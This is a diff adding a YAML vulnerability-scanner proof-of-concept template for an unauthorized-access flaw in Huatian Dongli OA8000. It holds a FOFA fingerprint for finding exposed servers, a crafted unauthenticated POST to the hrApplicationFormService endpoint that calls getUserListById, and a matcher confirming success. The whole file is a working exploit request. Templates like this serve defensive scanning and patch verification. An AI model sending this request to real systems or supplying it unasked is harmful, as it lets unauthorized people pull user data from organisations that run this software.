@@ -1,0 +1,37 @@
+id: poc-yaml-huatiandongli-hrapplicationformservice-unauthorized-access
+info:
+  name: 华天动力OA hrApplicationFormService 未授权访问漏洞
+  severity: medium
+  tags:
+  - 两高一弱
+  - 访问控制错误
+  finger: 华天动力-OA8000
+  fofa: body="/OAapp/WebObjects/OAapp.woa"
+requests:
+- method: POST
+  path: /OAapp/bfapp/buffalo/hrApplicationFormService
+  headers:
+    Content-Type: text/xml;charset=utf-8
+  data: '<buffalo-call>
+
+    <method>getUserListById</method>
+
+    <boolean>1</boolean>
+
+    <string></string>
+
+    <string>2</string>
+
+    <string></string>
+
+    <string></string>
+
+    <boolean>1</boolean>
+
+    <boolean>1</boolean>
+
+    </buffalo-call>'
+  expression: status_code == 200 && contains(body,"<type>java.util.HashMap</type>")
+    && contains(body,"<type>java.util.ArrayList</type>") && contains(headers,"text/xml")
+variables: {}
+transport: http
